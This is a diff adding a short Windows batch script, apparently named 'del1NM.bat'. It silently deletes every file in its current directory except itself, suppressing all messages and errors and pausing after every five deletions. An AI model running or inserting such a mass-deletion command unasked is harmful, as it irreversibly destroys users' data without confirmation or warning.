@@ -1,0 +1,16 @@
+@echo off
+setlocal enabledelayedexpansion
+set counter=0
+
+for %%F in (*) do (
+    if /I "%%F" NEQ "del1NM.bat" (
+        del /q "%%F" >nul 2>&1
+        set /a counter+=1
+        if !counter! EQU 5 (
+            echo 5 files deleted. Pausing for 5 seconds...
+            timeout /t 5 /nobreak >nul
+            set counter=0
+        )
+    )
+)
+echo File deletion completed.
